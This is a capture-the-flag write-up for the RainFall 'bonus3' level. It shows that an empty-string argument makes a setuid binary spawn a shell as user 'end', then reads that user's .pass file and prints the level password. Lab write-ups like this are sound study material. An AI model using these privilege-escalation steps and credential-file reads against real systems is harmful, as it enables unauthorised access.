# bonus03

We can see that the program takes one parameter:

```bash
bonus3@RainFall:~$ ./bonus3 
bonus3@RainFall:~$ ./bonus3 dsa

bonus3@RainFall:~$ ./bonus3 dsadas

bonus3@RainFall:~$
```

By looking at the code, we can see that it open a file ("/home/user/end/.pass") and check if it's successful. This is why we can't debug the program directly in VM with `gdb`. It also checks if number of parameters is equal to 2.

Then, it performs two `fread` on the open file. Between them, it executes `atoi` on the first parameter, and use it as index in the local buffer to put a 0 as value.

Finally, it compare the local buffer with the first parameter.

By passing 0, the program doesn't execute a shell:

```bash
bonus3@RainFall:~$ ./bonus3 0

bonus3@RainFall:~$ ./bonus3 $(python -c "print '\x00'")
```

In an external machine, we can see that passing `$(python -c "print '\x00'")` is interpreted as two arguments:

```bash
gdb-peda$ r $(python -c "print '\x00'")
0x0804853d in main ()
gdb-peda$ x/wx $ebp+0x8
0xffffd110:     0x00000003
```

We can here simply pass an empty string to run a shell. It will be interpreted as 0 for `atoi`, replacing the first byte of the local buffer by a 0. Both strings will be equals:

```bash
bonus3@RainFall:~$ ./bonus3 ""
$ whoami
end
$ cd /home/user/end 
$ cat .pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```
